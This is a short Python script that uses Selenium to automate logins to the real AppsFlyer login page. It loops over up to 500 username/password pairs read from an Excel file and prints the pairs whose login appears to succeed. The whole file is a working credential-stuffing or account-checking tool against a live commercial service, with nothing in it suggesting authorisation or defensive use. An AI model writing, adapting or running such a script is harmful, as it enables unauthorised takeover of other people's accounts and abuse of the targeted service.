import requests
from selenium import webdriver
import time
import pandas
import json
excel_data_df = pandas.read_excel('testet.xls', sheet_name='Лист1')
dictData = json.loads(excel_data_df.to_json())

browser = webdriver.Chrome()
for i in range(0, 500):
    #print(str(dictData["Login"][str(i)]) + " " + str(dictData["Password"][str(i)]))
    login = str(dictData["Login"][str(i)])
    password = str(dictData["Password"][str(i)])
    try:
        browser.implicitly_wait(10)
        browser.get('https://hq1.appsflyer.com/auth/login')
        browser.find_element_by_css_selector('#user-email').send_keys(login)
        browser.find_element_by_css_selector('#password-field').send_keys(password)
        browser.find_element_by_css_selector('.btn').click()



        element = browser.find_elements_by_css_selector('.MuiPaper-root')

        if len(element) <= 3: #and len(browser.find_elements_by_css_selector('confirmation-dialog-body'))>0:
            print(str(len(element)) + " " + login + " - " + password)


    finally:
        continue
